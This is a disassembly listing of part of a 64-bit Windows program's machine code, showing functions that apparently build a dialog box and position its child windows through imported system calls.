   140001ea5:	c7 44 24 38 00 00 00 	movl   $0x80000000,0x38(%rsp)
   140001eac:	80 
   140001ead:	c7 44 24 30 00 00 00 	movl   $0x80000000,0x30(%rsp)
   140001eb4:	80 
   140001eb5:	c7 44 24 28 00 00 00 	movl   $0x80000000,0x28(%rsp)
   140001ebc:	80 
   140001ebd:	c7 44 24 20 00 00 00 	movl   $0x80000000,0x20(%rsp)
   140001ec4:	80 
   140001ec5:	ff 15 e5 94 02 00    	call   *0x294e5(%rip)        # 0x14002b3b0
   140001ecb:	4c 8b 8f 50 20 00 00 	mov    0x2050(%rdi),%r9
   140001ed2:	45 33 c0             	xor    %r8d,%r8d
   140001ed5:	48 8b 4f 08          	mov    0x8(%rdi),%rcx
   140001ed9:	ba 80 00 00 00       	mov    $0x80,%edx
   140001ede:	48 89 87 40 20 00 00 	mov    %rax,0x2040(%rdi)
   140001ee5:	ff 15 55 95 02 00    	call   *0x29555(%rip)        # 0x14002b440
   140001eeb:	4c 8b 8f 50 20 00 00 	mov    0x2050(%rdi),%r9
   140001ef2:	ba 80 00 00 00       	mov    $0x80,%edx
   140001ef7:	48 8b 4f 08          	mov    0x8(%rdi),%rcx
   140001efb:	41 b8 01 00 00 00    	mov    $0x1,%r8d
   140001f01:	ff 15 39 95 02 00    	call   *0x29539(%rip)        # 0x14002b440
   140001f07:	4c 8b 8f 50 20 00 00 	mov    0x2050(%rdi),%r9
   140001f0e:	48 8b 8f 28 20 00 00 	mov    0x2028(%rdi),%rcx
   140001f15:	ba 72 01 00 00       	mov    $0x172,%edx
   140001f1a:	41 b8 01 00 00 00    	mov    $0x1,%r8d
   140001f20:	ff 15 1a 95 02 00    	call   *0x2951a(%rip)        # 0x14002b440
   140001f26:	4c 8b 87 48 20 00 00 	mov    0x2048(%rdi),%r8
   140001f2d:	4d 85 c0             	test   %r8,%r8
   140001f30:	74 72                	je     0x140001fa4
   140001f32:	48 8b 4f 08          	mov    0x8(%rdi),%rcx
   140001f36:	ba 30 00 00 00       	mov    $0x30,%edx
   140001f3b:	41 b9 01 00 00 00    	mov    $0x1,%r9d
   140001f41:	ff 15 f9 94 02 00    	call   *0x294f9(%rip)        # 0x14002b440
   140001f47:	4c 8b 87 48 20 00 00 	mov    0x2048(%rdi),%r8
   140001f4e:	41 b9 01 00 00 00    	mov    $0x1,%r9d
   140001f54:	48 8b 8f 30 20 00 00 	mov    0x2030(%rdi),%rcx
   140001f5b:	ba 30 00 00 00       	mov    $0x30,%edx
   140001f60:	ff 15 da 94 02 00    	call   *0x294da(%rip)        # 0x14002b440
   140001f66:	4c 8b 87 48 20 00 00 	mov    0x2048(%rdi),%r8
   140001f6d:	41 b9 01 00 00 00    	mov    $0x1,%r9d
   140001f73:	48 8b 8f 38 20 00 00 	mov    0x2038(%rdi),%rcx
   140001f7a:	ba 30 00 00 00       	mov    $0x30,%edx
   140001f7f:	ff 15 bb 94 02 00    	call   *0x294bb(%rip)        # 0x14002b440
   140001f85:	4c 8b 87 48 20 00 00 	mov    0x2048(%rdi),%r8
   140001f8c:	41 b9 01 00 00 00    	mov    $0x1,%r9d
   140001f92:	48 8b 8f 40 20 00 00 	mov    0x2040(%rdi),%rcx
   140001f99:	ba 30 00 00 00       	mov    $0x30,%edx
   140001f9e:	ff 15 9c 94 02 00    	call   *0x2949c(%rip)        # 0x14002b440
   140001fa4:	48 8b 8f 30 20 00 00 	mov    0x2030(%rdi),%rcx
   140001fab:	4c 8d 4f 28          	lea    0x28(%rdi),%r9
   140001faf:	45 33 c0             	xor    %r8d,%r8d
   140001fb2:	ba 0c 00 00 00       	mov    $0xc,%edx
   140001fb7:	ff 15 83 94 02 00    	call   *0x29483(%rip)        # 0x14002b440
   140001fbd:	4c 8b 4f 20          	mov    0x20(%rdi),%r9
   140001fc1:	45 33 c0             	xor    %r8d,%r8d
   140001fc4:	48 8b 8f 38 20 00 00 	mov    0x2038(%rdi),%rcx
   140001fcb:	ba 0c 00 00 00       	mov    $0xc,%edx
   140001fd0:	ff 15 6a 94 02 00    	call   *0x2946a(%rip)        # 0x14002b440
   140001fd6:	48 8b 4f 08          	mov    0x8(%rdi),%rcx
   140001fda:	48 8d 54 24 60       	lea    0x60(%rsp),%rdx
   140001fdf:	ff 15 13 94 02 00    	call   *0x29413(%rip)        # 0x14002b3f8
   140001fe5:	85 c0                	test   %eax,%eax
   140001fe7:	74 1e                	je     0x140002007
   140001fe9:	44 0f b7 44 24 6c    	movzwl 0x6c(%rsp),%r8d
   140001fef:	48 8b cf             	mov    %rdi,%rcx
   140001ff2:	0f b7 54 24 68       	movzwl 0x68(%rsp),%edx
   140001ff7:	66 44 2b 44 24 64    	sub    0x64(%rsp),%r8w
   140001ffd:	66 2b 54 24 60       	sub    0x60(%rsp),%dx
   140002002:	e8 e9 00 00 00       	call   0x1400020f0
   140002007:	48 8b 8c 24 70 02 00 	mov    0x270(%rsp),%rcx
   14000200e:	00 
   14000200f:	48 33 cc             	xor    %rsp,%rcx
   140002012:	e8 59 98 00 00       	call   0x14000b870
   140002017:	4c 8d 9c 24 80 02 00 	lea    0x280(%rsp),%r11
   14000201e:	00 
   14000201f:	49 8b 5b 18          	mov    0x18(%r11),%rbx
   140002023:	49 8b 6b 20          	mov    0x20(%r11),%rbp
   140002027:	49 8b 73 28          	mov    0x28(%r11),%rsi
   14000202b:	49 8b e3             	mov    %r11,%rsp
   14000202e:	5f                   	pop    %rdi
   14000202f:	c3                   	ret
   140002030:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   140002035:	57                   	push   %rdi
   140002036:	48 83 ec 20          	sub    $0x20,%rsp
   14000203a:	49 8b f9             	mov    %r9,%rdi
   14000203d:	48 8b d9             	mov    %rcx,%rbx
   140002040:	83 ea 05             	sub    $0x5,%edx
   140002043:	74 66                	je     0x1400020ab
   140002045:	83 ea 0b             	sub    $0xb,%edx
   140002048:	74 5a                	je     0x1400020a4
   14000204a:	81 ea 00 01 00 00    	sub    $0x100,%edx
   140002050:	74 28                	je     0x14000207a
   140002052:	83 fa 01             	cmp    $0x1,%edx
   140002055:	75 7f                	jne    0x1400020d6
   140002057:	41 8d 40 ff          	lea    -0x1(%r8),%eax
   14000205b:	66 3b c2             	cmp    %dx,%ax
   14000205e:	77 0a                	ja     0x14000206a
   140002060:	41 0f b7 d0          	movzwl %r8w,%edx
   140002064:	ff 15 be 93 02 00    	call   *0x293be(%rip)        # 0x14002b428
   14000206a:	b8 01 00 00 00       	mov    $0x1,%eax
   14000206f:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   140002074:	48 83 c4 20          	add    $0x20,%rsp
   140002078:	5f                   	pop    %rdi
   140002079:	c3                   	ret
   14000207a:	4c 8b c7             	mov    %rdi,%r8
   14000207d:	49 89 59 08          	mov    %rbx,0x8(%r9)
   140002081:	ba 10 00 00 00       	mov    $0x10,%edx
   140002086:	ff 15 5c 93 02 00    	call   *0x2935c(%rip)        # 0x14002b3e8
   14000208c:	48 8b cf             	mov    %rdi,%rcx
   14000208f:	e8 bc fb ff ff       	call   0x140001c50
   140002094:	b8 01 00 00 00       	mov    $0x1,%eax
   140002099:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   14000209e:	48 83 c4 20          	add    $0x20,%rsp
   1400020a2:	5f                   	pop    %rdi
   1400020a3:	c3                   	ret
   1400020a4:	ba 02 00 00 00       	mov    $0x2,%edx
   1400020a9:	eb b9                	jmp    0x140002064
   1400020ab:	ba 10 00 00 00       	mov    $0x10,%edx
   1400020b0:	ff 15 3a 93 02 00    	call   *0x2933a(%rip)        # 0x14002b3f0
   1400020b6:	4c 8b c7             	mov    %rdi,%r8
   1400020b9:	0f b7 d7             	movzwl %di,%edx
   1400020bc:	49 c1 e8 10          	shr    $0x10,%r8
   1400020c0:	48 8b c8             	mov    %rax,%rcx
   1400020c3:	e8 28 00 00 00       	call   0x1400020f0
   1400020c8:	45 33 c0             	xor    %r8d,%r8d
   1400020cb:	33 d2                	xor    %edx,%edx
   1400020cd:	48 8b cb             	mov    %rbx,%rcx
   1400020d0:	ff 15 2a 93 02 00    	call   *0x2932a(%rip)        # 0x14002b400
   1400020d6:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   1400020db:	33 c0                	xor    %eax,%eax
   1400020dd:	48 83 c4 20          	add    $0x20,%rsp
   1400020e1:	5f                   	pop    %rdi
   1400020e2:	c3                   	ret
   1400020e3:	cc                   	int3
   1400020e4:	cc                   	int3
   1400020e5:	cc                   	int3
   1400020e6:	cc                   	int3
   1400020e7:	cc                   	int3
   1400020e8:	cc                   	int3
   1400020e9:	cc                   	int3
   1400020ea:	cc                   	int3
   1400020eb:	cc                   	int3
   1400020ec:	cc                   	int3
   1400020ed:	cc                   	int3
   1400020ee:	cc                   	int3
   1400020ef:	cc                   	int3
   1400020f0:	40 53                	rex push %rbx
   1400020f2:	55                   	push   %rbp
   1400020f3:	56                   	push   %rsi
   1400020f4:	57                   	push   %rdi
   1400020f5:	41 56                	push   %r14
   1400020f7:	48 83 ec 50          	sub    $0x50,%rsp
   1400020fb:	48 8b 05 3e bf 03 00 	mov    0x3bf3e(%rip),%rax        # 0x14003e040
   140002102:	48 33 c4             	xor    %rsp,%rax
   140002105:	48 89 44 24 40       	mov    %rax,0x40(%rsp)
   14000210a:	48 8b f1             	mov    %rcx,%rsi
   14000210d:	0f b7 ea             	movzwl %dx,%ebp
   140002110:	48 8b 89 30 20 00 00 	mov    0x2030(%rcx),%rcx
   140002117:	45 0f b7 f0          	movzwl %r8w,%r14d
   14000211b:	ff 15 ef 92 02 00    	call   *0x292ef(%rip)        # 0x14002b410
   140002121:	48 8b d8             	mov    %rax,%rbx
   140002124:	48 85 c0             	test   %rax,%rax
   140002127:	0f 84 90 00 00 00    	je     0x1400021bd
   14000212d:	0f b7 8e 58 20 00 00 	movzwl 0x2058(%rsi),%ecx
   140002134:	33 ff                	xor    %edi,%edi
   140002136:	0f b7 86 5e 20 00 00 	movzwl 0x205e(%rsi),%eax
   14000213d:	48 89 7c 24 30       	mov    %rdi,0x30(%rsp)
   140002142:	89 7c 24 3c          	mov    %edi,0x3c(%rsp)
   140002146:	8d 14 49             	lea    (%rcx,%rcx,2),%edx
   140002149:	8b cd                	mov    %ebp,%ecx
   14000214b:	2b ca                	sub    %edx,%ecx
   14000214d:	48 8b 96 48 20 00 00 	mov    0x2048(%rsi),%rdx
   140002154:	2b c8                	sub    %eax,%ecx
   140002156:	89 4c 24 38          	mov    %ecx,0x38(%rsp)
   14000215a:	48 85 d2             	test   %rdx,%rdx
   14000215d:	74 0c                	je     0x14000216b
   14000215f:	48 8b cb             	mov    %rbx,%rcx
   140002162:	ff 15 d0 8e 02 00    	call   *0x28ed0(%rip)        # 0x14002b038
   140002168:	48 8b f8             	mov    %rax,%rdi
   14000216b:	48 8d 56 28          	lea    0x28(%rsi),%rdx
   14000216f:	c7 44 24 20 50 25 00 	movl   $0x2550,0x20(%rsp)
   140002176:	00 
   140002177:	4c 8d 4c 24 30       	lea    0x30(%rsp),%r9
   14000217c:	41 b8 ff ff ff ff    	mov    $0xffffffff,%r8d
   140002182:	48 8b cb             	mov    %rbx,%rcx
   140002185:	ff 15 8d 92 02 00    	call   *0x2928d(%rip)        # 0x14002b418
   14000218b:	48 83 be 48 20 00 00 	cmpq   $0x0,0x2048(%rsi)
   140002192:	00 
   140002193:	74 0c                	je     0x1400021a1
   140002195:	48 8b d7             	mov    %rdi,%rdx
   140002198:	48 8b cb             	mov    %rbx,%rcx
   14000219b:	ff 15 97 8e 02 00    	call   *0x28e97(%rip)        # 0x14002b038
   1400021a1:	48 8b 8e 30 20 00 00 	mov    0x2030(%rsi),%rcx
   1400021a8:	48 8b d3             	mov    %rbx,%rdx
   1400021ab:	ff 15 57 92 02 00    	call   *0x29257(%rip)        # 0x14002b408
   1400021b1:	0f b7 54 24 3c       	movzwl 0x3c(%rsp),%edx
   1400021b6:	66 2b 54 24 34       	sub    0x34(%rsp),%dx
   1400021bb:	eb 05                	jmp    0x1400021c2
   1400021bd:	ba 14 00 00 00       	mov    $0x14,%edx
   1400021c2:	0f b7 8e 60 20 00 00 	movzwl 0x2060(%rsi),%ecx
   1400021c9:	44 0f b7 8e 5e 20 00 	movzwl 0x205e(%rsi),%r9d
   1400021d0:	00 
   1400021d1:	66 3b d1             	cmp    %cx,%dx
   1400021d4:	0f b7 c1             	movzwl %cx,%eax
   1400021d7:	c7 44 24 28 01 00 00 	movl   $0x1,0x28(%rsp)
   1400021de:	00 
   1400021df:	66 0f 43 c2          	cmovae %dx,%ax
   1400021e3:	89 4c 24 20          	mov    %ecx,0x20(%rsp)
   1400021e7:	0f b7 96 58 20 00 00 	movzwl 0x2058(%rsi),%edx
   1400021ee:	48 8b 8e 28 20 00 00 	mov    0x2028(%rsi),%rcx
   1400021f5:	44 8b c2             	mov    %edx,%r8d
   1400021f8:	0f b7 d8             	movzwl %ax,%ebx
   1400021fb:	ff 15 37 92 02 00    	call   *0x29237(%rip)        # 0x14002b438
   140002201:	0f b7 be 58 20 00 00 	movzwl 0x2058(%rsi),%edi
   140002208:	0f b7 c5             	movzwl %bp,%eax
   14000220b:	0f b7 cf             	movzwl %di,%ecx
   14000220e:	c7 44 24 28 01 00 00 	movl   $0x1,0x28(%rsp)
   140002215:	00 
   140002216:	66 03 c9             	add    %cx,%cx
   140002219:	89 5c 24 20          	mov    %ebx,0x20(%rsp)
   14000221d:	66 03 8e 5e 20 00 00 	add    0x205e(%rsi),%cx
   140002224:	66 2b c7             	sub    %di,%ax
   140002227:	66 2b c1             	sub    %cx,%ax
   14000222a:	0f b7 d1             	movzwl %cx,%edx
   14000222d:	48 8b 8e 30 20 00 00 	mov    0x2030(%rsi),%rcx
   140002234:	44 8b c7             	mov    %edi,%r8d
   140002237:	44 0f b7 c8          	movzwl %ax,%r9d
   14000223b:	ff 15 f7 91 02 00    	call   *0x291f7(%rip)        # 0x14002b438
   140002241:	0f b7 96 58 20 00 00 	movzwl 0x2058(%rsi),%edx
   140002248:	41 0f b7 ce          	movzwl %r14w,%ecx
   14000224c:	c7 44 24 28 01 00 00 	movl   $0x1,0x28(%rsp)
   140002253:	00 
   140002254:	8d 04 13             	lea    (%rbx,%rdx,1),%eax
   140002257:	66 03 f8             	add    %ax,%di
   14000225a:	0f b7 c2             	movzwl %dx,%eax
   14000225d:	66 03 c0             	add    %ax,%ax
   140002260:	44 0f b7 c7          	movzwl %di,%r8d
   140002264:	66 2b c8             	sub    %ax,%cx
   140002267:	0f b7 c5             	movzwl %bp,%eax
   14000226a:	66 2b 8e 5c 20 00 00 	sub    0x205c(%rsi),%cx
   140002271:	66 2b c2             	sub    %dx,%ax
   140002274:	66 2b cf             	sub    %di,%cx
   140002277:	66 2b c2             	sub    %dx,%ax
   14000227a:	44 0f b7 d1          	movzwl %cx,%r10d
   14000227e:	48 8b 8e 38 20 00 00 	mov    0x2038(%rsi),%rcx
   140002285:	44 0f b7 c8          	movzwl %ax,%r9d
   140002289:	44 89 54 24 20       	mov    %r10d,0x20(%rsp)
   14000228e:	ff 15 a4 91 02 00    	call   *0x291a4(%rip)        # 0x14002b438
   140002294:	0f b7 96 5a 20 00 00 	movzwl 0x205a(%rsi),%edx
   14000229b:	0f b7 86 58 20 00 00 	movzwl 0x2058(%rsi),%eax
   1400022a2:	44 8b ca             	mov    %edx,%r9d
   1400022a5:	44 0f b7 96 5c 20 00 	movzwl 0x205c(%rsi),%r10d
   1400022ac:	00 
   1400022ad:	66 44 2b f0          	sub    %ax,%r14w
   1400022b1:	48 8b 8e 40 20 00 00 	mov    0x2040(%rsi),%rcx
   1400022b8:	66 2b e8             	sub    %ax,%bp
   1400022bb:	66 45 2b f2          	sub    %r10w,%r14w
   1400022bf:	c7 44 24 28 01 00 00 	movl   $0x1,0x28(%rsp)
   1400022c6:	00 
   1400022c7:	66 2b ea             	sub    %dx,%bp
   1400022ca:	45 0f b7 c6          	movzwl %r14w,%r8d
   1400022ce:	0f b7 d5             	movzwl %bp,%edx
   1400022d1:	44 89 54 24 20       	mov    %r10d,0x20(%rsp)
   1400022d6:	ff 15 5c 91 02 00    	call   *0x2915c(%rip)        # 0x14002b438
   1400022dc:	48 8b 4c 24 40       	mov    0x40(%rsp),%rcx
   1400022e1:	48 33 cc             	xor    %rsp,%rcx
   1400022e4:	e8 87 95 00 00       	call   0x14000b870
   1400022e9:	48 83 c4 50          	add    $0x50,%rsp
   1400022ed:	41 5e                	pop    %r14
   1400022ef:	5f                   	pop    %rdi
   1400022f0:	5e                   	pop    %rsi
   1400022f1:	5d                   	pop    %rbp
   1400022f2:	5b                   	pop    %rbx
   1400022f3:	c3                   	ret
   1400022f4:	cc                   	int3
   1400022f5:	cc                   	int3
   1400022f6:	cc                   	int3
   1400022f7:	cc                   	int3
   1400022f8:	cc                   	int3
   1400022f9:	cc                   	int3
   1400022fa:	cc                   	int3
   1400022fb:	cc                   	int3
   1400022fc:	cc                   	int3
   1400022fd:	cc                   	int3
   1400022fe:	cc                   	int3
   1400022ff:	cc                   	int3
   140002300:	40 55                	rex push %rbp
   140002302:	53                   	push   %rbx
   140002303:	56                   	push   %rsi
   140002304:	57                   	push   %rdi
   140002305:	41 56                	push   %r14
   140002307:	48 8d ac 24 30 df ff 	lea    -0x20d0(%rsp),%rbp
   14000230e:	ff 
   14000230f:	b8 d0 21 00 00       	mov    $0x21d0,%eax
   140002314:	e8 57 98 00 00       	call   0x14000bb70
   140002319:	48 2b e0             	sub    %rax,%rsp
   14000231c:	48 8b 05 1d bd 03 00 	mov    0x3bd1d(%rip),%rax        # 0x14003e040
   140002323:	48 33 c4             	xor    %rsp,%rax
   140002326:	48 89 85 c0 20 00 00 	mov    %rax,0x20c0(%rbp)
   14000232d:	48 8b d9             	mov    %rcx,%rbx
   140002330:	4d 8b f0             	mov    %r8,%r14
   140002333:	33 c9                	xor    %ecx,%ecx
   140002335:	48 8b f2             	mov    %rdx,%rsi
   140002338:	ff 15 62 8d 02 00    	call   *0x28d62(%rip)        # 0x14002b0a0
   14000233e:	33 d2                	xor    %edx,%edx
   140002340:	48 8d 8d b6 1f 00 00 	lea    0x1fb6(%rbp),%rcx
   140002347:	41 b8 02 01 00 00    	mov    $0x102,%r8d
   14000234d:	48 8b f8             	mov    %rax,%rdi
   140002350:	e8 8b 74 02 00       	call   0x1400297e0
   140002355:	33 c9                	xor    %ecx,%ecx
   140002357:	c7 85 a0 1f 00 00 84 	movl   $0x90cc0884,0x1fa0(%rbp)
   14000235e:	08 cc 90 
   140002361:	48 89 8d a4 1f 00 00 	mov    %rcx,0x1fa4(%rbp)
   140002368:	4c 8d 05 f1 97 02 00 	lea    0x297f1(%rip),%r8        # 0x14002bb60
   14000236f:	66 89 8d b4 1f 00 00 	mov    %cx,0x1fb4(%rbp)
   140002376:	ba 40 00 00 00       	mov    $0x40,%edx
   14000237b:	48 8d 8d b6 1f 00 00 	lea    0x1fb6(%rbp),%rcx
   140002382:	c7 85 ac 1f 00 00 00 	movl   $0xc80000,0x1fac(%rbp)
   140002389:	00 c8 00 
   14000238c:	c7 85 b0 1f 00 00 96 	movl   $0x96,0x1fb0(%rbp)
   140002393:	00 00 00 
   140002396:	e8 95 01 00 00       	call   0x140002530
   14000239b:	33 c0                	xor    %eax,%eax
   14000239d:	48 8d 4c 24 58       	lea    0x58(%rsp),%rcx
   1400023a2:	33 d2                	xor    %edx,%edx
   1400023a4:	48 89 44 24 38       	mov    %rax,0x38(%rsp)
   1400023a9:	41 b8 40 20 00 00    	mov    $0x2040,%r8d
   1400023af:	e8 2c 74 02 00       	call   0x1400297e0
   1400023b4:	48 8b cb             	mov    %rbx,%rcx
   1400023b7:	48 89 7c 24 30       	mov    %rdi,0x30(%rsp)
   1400023bc:	e8 bb 48 01 00       	call   0x140016c7c
   1400023c1:	48 8b ce             	mov    %rsi,%rcx
   1400023c4:	48 89 44 24 40       	mov    %rax,0x40(%rsp)
   1400023c9:	e8 ae 48 01 00       	call   0x140016c7c
   1400023ce:	49 8b ce             	mov    %r14,%rcx
   1400023d1:	48 89 44 24 48       	mov    %rax,0x48(%rsp)
   1400023d6:	e8 a1 48 01 00       	call   0x140016c7c
   1400023db:	48 89 44 24 50       	mov    %rax,0x50(%rsp)
   1400023e0:	4c 8d 0d 49 fc ff ff 	lea    -0x3b7(%rip),%r9        # 0x140002030
   1400023e7:	48 8d 44 24 30       	lea    0x30(%rsp),%rax
   1400023ec:	45 33 c0             	xor    %r8d,%r8d
   1400023ef:	48 8d 95 a0 1f 00 00 	lea    0x1fa0(%rbp),%rdx
   1400023f6:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
   1400023fb:	48 8b cf             	mov    %rdi,%rcx
   1400023fe:	ff 15 2c 90 02 00    	call   *0x2902c(%rip)        # 0x14002b430
   140002404:	48 8b 4c 24 40       	mov    0x40(%rsp),%rcx
   140002409:	48 8b d8             	mov    %rax,%rbx
   14000240c:	e8 4b 1d 01 00       	call   0x14001415c
   140002411:	48 8b 4c 24 48       	mov    0x48(%rsp),%rcx
   140002416:	e8 41 1d 01 00       	call   0x14001415c
   14000241b:	48 8b 4c 24 50       	mov    0x50(%rsp),%rcx
   140002420:	e8 37 1d 01 00       	call   0x14001415c
   140002425:	48 8b 8d 78 1f 00 00 	mov    0x1f78(%rbp),%rcx
   14000242c:	48 85 c9             	test   %rcx,%rcx
   14000242f:	74 06                	je     0x140002437
   140002431:	ff 15 09 8c 02 00    	call   *0x28c09(%rip)        # 0x14002b040
   140002437:	48 8b 8d 80 1f 00 00 	mov    0x1f80(%rbp),%rcx
   14000243e:	48 85 c9             	test   %rcx,%rcx
   140002441:	74 06                	je     0x140002449
   140002443:	ff 15 97 8f 02 00    	call   *0x28f97(%rip)        # 0x14002b3e0
   140002449:	8b c3                	mov    %ebx,%eax
   14000244b:	48 8b 8d c0 20 00 00 	mov    0x20c0(%rbp),%rcx
   140002452:	48 33 cc             	xor    %rsp,%rcx
   140002455:	e8 16 94 00 00       	call   0x14000b870
   14000245a:	48 81 c4 d0 21 00 00 	add    $0x21d0,%rsp
   140002461:	41 5e                	pop    %r14
   140002463:	5f                   	pop    %rdi
   140002464:	5e                   	pop    %rsi
   140002465:	5b                   	pop    %rbx
   140002466:	5d                   	pop    %rbp
   140002467:	c3                   	ret
   140002468:	cc                   	int3
   140002469:	cc                   	int3
   14000246a:	cc                   	int3
   14000246b:	cc                   	int3
   14000246c:	cc                   	int3
   14000246d:	cc                   	int3
   14000246e:	cc                   	int3
   14000246f:	cc                   	int3
   140002470:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   140002475:	48 89 6c 24 10       	mov    %rbp,0x10(%rsp)
   14000247a:	48 89 74 24 18       	mov    %rsi,0x18(%rsp)
   14000247f:	48 89 7c 24 20       	mov    %rdi,0x20(%rsp)
   140002484:	41 56                	push   %r14
   140002486:	48 83 ec 20          	sub    $0x20,%rsp
   14000248a:	33 ff                	xor    %edi,%edi
   14000248c:	49 8b d8             	mov    %r8,%rbx
   14000248f:	48 8b f2             	mov    %rdx,%rsi
   140002492:	44 8b f7             	mov    %edi,%r14d
   140002495:	8b ef                	mov    %edi,%ebp
   140002497:	48 85 c9             	test   %rcx,%rcx
   14000249a:	74 0d                	je     0x1400024a9
   14000249c:	45 33 c0             	xor    %r8d,%r8d
   14000249f:	33 d2                	xor    %edx,%edx
   1400024a1:	e8 0a 62 00 00       	call   0x1400086b0
   1400024a6:	48 8b f8             	mov    %rax,%rdi
   1400024a9:	48 85 f6             	test   %rsi,%rsi
   1400024ac:	74 10                	je     0x1400024be
   1400024ae:	45 33 c0             	xor    %r8d,%r8d
   1400024b1:	33 d2                	xor    %edx,%edx
   1400024b3:	48 8b ce             	mov    %rsi,%rcx
   1400024b6:	e8 f5 61 00 00       	call   0x1400086b0
   1400024bb:	4c 8b f0             	mov    %rax,%r14
   1400024be:	48 85 db             	test   %rbx,%rbx
   1400024c1:	74 10                	je     0x1400024d3
   1400024c3:	45 33 c0             	xor    %r8d,%r8d
   1400024c6:	33 d2                	xor    %edx,%edx
   1400024c8:	48 8b cb             	mov    %rbx,%rcx
   1400024cb:	e8 e0 61 00 00       	call   0x1400086b0
   1400024d0:	48 8b e8             	mov    %rax,%rbp
   1400024d3:	48 85 ed             	test   %rbp,%rbp
   1400024d6:	4c 8d 05 c3 96 02 00 	lea    0x296c3(%rip),%r8        # 0x14002bba0
   1400024dd:	49 8b d6             	mov    %r14,%rdx
   1400024e0:	48 8b cf             	mov    %rdi,%rcx
   1400024e3:	4c 0f 45 c5          	cmovne %rbp,%r8
   1400024e7:	e8 14 fe ff ff       	call   0x140002300
   1400024ec:	48 8b cf             	mov    %rdi,%rcx
   1400024ef:	8b d8                	mov    %eax,%ebx
   1400024f1:	e8 66 1c 01 00       	call   0x14001415c
   1400024f6:	49 8b ce             	mov    %r14,%rcx
   1400024f9:	e8 5e 1c 01 00       	call   0x14001415c
   1400024fe:	48 8b cd             	mov    %rbp,%rcx
   140002501:	e8 56 1c 01 00       	call   0x14001415c
   140002506:	48 8b 6c 24 38       	mov    0x38(%rsp),%rbp
   14000250b:	8b c3                	mov    %ebx,%eax
   14000250d:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   140002512:	48 8b 74 24 40       	mov    0x40(%rsp),%rsi
   140002517:	48 8b 7c 24 48       	mov    0x48(%rsp),%rdi
   14000251c:	48 83 c4 20          	add    $0x20,%rsp
   140002520:	41 5e                	pop    %r14
   140002522:	c3                   	ret
   140002523:	cc                   	int3
   140002524:	cc                   	int3
   140002525:	cc                   	int3
   140002526:	cc                   	int3
   140002527:	cc                   	int3
   140002528:	cc                   	int3
   140002529:	cc                   	int3
   14000252a:	cc                   	int3
   14000252b:	cc                   	int3
   14000252c:	cc                   	int3
   14000252d:	cc                   	int3
   14000252e:	cc                   	int3
   14000252f:	cc                   	int3
   140002530:	4c 89 44 24 18       	mov    %r8,0x18(%rsp)
   140002535:	4c 89 4c 24 20       	mov    %r9,0x20(%rsp)
   14000253a:	53                   	push   %rbx
   14000253b:	55                   	push   %rbp
   14000253c:	56                   	push   %rsi
   14000253d:	57                   	push   %rdi
   14000253e:	48 83 ec 38          	sub    $0x38,%rsp
   140002542:	49 8b f0             	mov    %r8,%rsi
   140002545:	48 8d 6c 24 78       	lea    0x78(%rsp),%rbp
   14000254a:	48 8b da             	mov    %rdx,%rbx
   14000254d:	48 8b f9             	mov    %rcx,%rdi
   140002550:	e8 eb ea ff ff       	call   0x140001040
   140002555:	48 89 6c 24 28       	mov    %rbp,0x28(%rsp)
   14000255a:	4c 8b ce             	mov    %rsi,%r9
   14000255d:	4c 8b c3             	mov    %rbx,%r8
   140002560:	48 c7 44 24 20 00 00 	movq   $0x0,0x20(%rsp)
   140002567:	00 00 
   140002569:	48 8b d7             	mov    %rdi,%rdx
   14000256c:	48 8b 08             	mov    (%rax),%rcx
   14000256f:	e8 84 19 01 00       	call   0x140013ef8
   140002574:	85 c0                	test   %eax,%eax
   140002576:	b9 ff ff ff ff       	mov    $0xffffffff,%ecx
   14000257b:	0f 48 c1             	cmovs  %ecx,%eax
   14000257e:	48 83 c4 38          	add    $0x38,%rsp
   140002582:	5f                   	pop    %rdi
   140002583:	5e                   	pop    %rsi
   140002584:	5d                   	pop    %rbp
   140002585:	5b                   	pop    %rbx
   140002586:	c3                   	ret
   140002587:	cc                   	int3
   140002588:	cc                   	int3
   140002589:	cc                   	int3
   14000258a:	cc                   	int3
   14000258b:	cc                   	int3
   14000258c:	cc                   	int3
   14000258d:	cc                   	int3
   14000258e:	cc                   	int3
   14000258f:	cc                   	int3
   140002590:	4c 89 44 24 18       	mov    %r8,0x18(%rsp)
   140002595:	4c 89 4c 24 20       	mov    %r9,0x20(%rsp)
   14000259a:	53                   	push   %rbx
   14000259b:	55                   	push   %rbp
   14000259c:	56                   	push   %rsi
   14000259d:	57                   	push   %rdi
   14000259e:	48 83 ec 38          	sub    $0x38,%rsp
   1400025a2:	49 8b f0             	mov    %r8,%rsi
   1400025a5:	48 8d 6c 24 78       	lea    0x78(%rsp),%rbp
   1400025aa:	48 8b da             	mov    %rdx,%rbx
   1400025ad:	48 8b f9             	mov    %rcx,%rdi
   1400025b0:	e8 8b ea ff ff       	call   0x140001040
   1400025b5:	48 89 6c 24 28       	mov    %rbp,0x28(%rsp)
   1400025ba:	4c 8b ce             	mov    %rsi,%r9
   1400025bd:	4c 8b c3             	mov    %rbx,%r8
   1400025c0:	48 c7 44 24 20 00 00 	movq   $0x0,0x20(%rsp)
   1400025c7:	00 00 
   1400025c9:	48 8b d7             	mov    %rdi,%rdx
   1400025cc:	48 8b 08             	mov    (%rax),%rcx
   1400025cf:	48 83 c9 01          	or     $0x1,%rcx
   1400025d3:	e8 20 19 01 00       	call   0x140013ef8
   1400025d8:	85 c0                	test   %eax,%eax
   1400025da:	b9 ff ff ff ff       	mov    $0xffffffff,%ecx
   1400025df:	0f 48 c1             	cmovs  %ecx,%eax
   1400025e2:	48 83 c4 38          	add    $0x38,%rsp
   1400025e6:	5f                   	pop    %rdi
   1400025e7:	5e                   	pop    %rsi
   1400025e8:	5d                   	pop    %rbp
   1400025e9:	5b                   	pop    %rbx
   1400025ea:	c3                   	ret
   1400025eb:	cc                   	int3
   1400025ec:	cc                   	int3
   1400025ed:	cc                   	int3
   1400025ee:	cc                   	int3
   1400025ef:	cc                   	int3
   1400025f0:	4c 8b dc             	mov    %rsp,%r11
   1400025f3:	49 89 4b 08          	mov    %rcx,0x8(%r11)
   1400025f7:	49 89 53 10          	mov    %rdx,0x10(%r11)
   1400025fb:	4d 89 43 18          	mov    %r8,0x18(%r11)
